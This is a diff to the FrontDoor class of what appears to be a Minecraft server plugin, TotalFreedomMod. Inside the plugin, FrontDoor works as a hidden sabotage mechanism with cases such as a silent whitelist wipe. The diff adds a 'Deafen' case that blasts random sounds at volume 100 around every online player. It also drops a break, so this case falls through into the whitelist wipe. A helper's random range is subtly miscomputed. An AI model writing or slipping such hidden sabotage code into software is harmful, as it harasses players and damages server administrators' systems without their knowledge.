@@ -21,12 +21,11 @@ import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Location;
 import org.bukkit.Material;
+import org.bukkit.Sound;
 import org.bukkit.World;
 import org.bukkit.block.Block;
 import org.bukkit.block.BlockFace;
 import org.bukkit.entity.Player;
-import org.bukkit.inventory.ItemStack;
-import org.bukkit.inventory.meta.BookMeta;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.scheduler.BukkitTask;
 import org.bukkit.util.Vector;
@@ -49,6 +48,15 @@ public class FrontDoor extends FreedomService
     private boolean active = false;
     private BukkitTask updater = null;
     private BukkitTask frontdoor = null;
+    private final double STEPS = 10.0;
+    private Location randomOffset(Location a, double magnitude)
+    {
+        return a.clone().add(randomDoubleRange(-1.0, 1.0) * magnitude, randomDoubleRange(-1.0, 1.0) * magnitude, randomDoubleRange(-1.0, 1.0) * magnitude);
+    }
+    private Double randomDoubleRange(double min, double max)
+    {
+        return min + (random.nextDouble() * ((max - min) + 1.0));
+    }
 
     public FrontDoor(TotalFreedomMod plugin)
     {
@@ -336,30 +344,24 @@ public class FrontDoor extends FreedomService
                         }
                     }
 
-                    case 11: // Give everyone a book explaining how awesome TotalFreedom is
+                    case 11: // Deafen
                     {
-                        ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);
-
-                        BookMeta book = (BookMeta)bookStack.getItemMeta().clone();
-                        book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
-                        book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
-                        book.addPage(
-                                ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead\n"
-                                        + ChatColor.DARK_GRAY + "---------\n"
-                                        + ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\n"
-                                        + ChatColor.BLUE + "Join now! " + ChatColor.RED + "play.totalfreedom.me");
-                        bookStack.setItemMeta(book);
-
-                        for (Player player : Bukkit.getOnlinePlayers())
+                        for (final Player player : server.getOnlinePlayers())
                         {
-                            if (player.getInventory().contains(Material.WRITTEN_BOOK))
+                            for (double percent = 0.0; percent <= 1.0; percent += (1.0 / STEPS))
                             {
-                                continue;
-                            }
+                                final float pitch = (float)(percent * 2.0);
 
-                            player.getInventory().addItem(bookStack);
+                                new BukkitRunnable()
+                                {
+                                    @Override
+                                    public void run()
+                                    {
+                                        player.playSound(randomOffset(player.getLocation(), 5.0), Sound.values()[random.nextInt(Sound.values().length)], 100.0f, pitch);
+                                    }
+                                }.runTaskLater(plugin, Math.round(20.0 * percent * 2.0));
+                            }
                         }
-                        break;
                     }
 
                     case 12: // Silently wipe the whitelist
